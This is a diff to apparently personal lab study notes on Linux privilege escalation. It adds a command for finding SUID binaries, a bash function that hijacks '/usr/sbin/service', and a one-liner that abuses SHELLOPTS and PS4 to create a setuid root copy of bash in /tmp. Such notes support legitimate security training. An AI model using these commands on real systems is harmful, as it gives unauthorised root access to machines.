@@ -545,6 +545,11 @@ export PATH=/tmp:$PATH
 id
 ````
 ### SUID and SGID Executables-Abusing Shell Features 1
+- Detection
+````
+ find / -type f -perm -04000 -ls 2>/dev/null
+````
+- Make note of all the SUID binaries 
 - The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable `/usr/sbin/service` to start the apache2 webserver.
 Verify this with strings:
 ````
@@ -557,14 +562,14 @@ strings /usr/local/bin/suid-env2
 ````
 Create a Bash function with the name `/usr/sbin/service` that executes a new Bash shell (using -p so permissions are preserved) and export the function:
 ````
-function /usr/sbin/service { /bin/bash -p; }
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ````
 - Run the suid-env2 executable to gain a root shell:
 ````
 /usr/local/bin/suid-env2
 ````
-### SUID and SGID Executables-Abusing Shell Features 2
+#### SUID and SGID Executables-Abusing Shell Features 2
 - Note: This will not work on Bash versions 4.4 and above.
 - When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
 - Run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of `/bin/bash`:
@@ -574,6 +579,10 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 Run the `/tmp/rootbash` executable with -p to gain a shell running with root privileges:
 ````
 /tmp/rootbash -p
+````
+- OR One liner
+````
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
 ````
 ### NFS
 - Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
